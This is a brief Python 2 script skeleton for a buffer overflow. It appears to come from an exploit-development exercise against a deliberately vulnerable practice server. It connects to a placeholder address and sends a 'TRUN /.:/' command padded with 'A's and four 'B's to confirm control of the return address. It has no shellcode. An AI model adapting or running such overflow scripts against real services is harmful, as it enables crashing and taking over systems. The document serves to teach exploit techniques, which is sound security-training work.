import sys,socket
offset = "A"*<actual value> + "B"*4
try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('<ip>',<port>))
	s.send(('TRUN /.:/' + offset))
	s.close()
except:
	print "[+] ERROR"
	sys.exit()
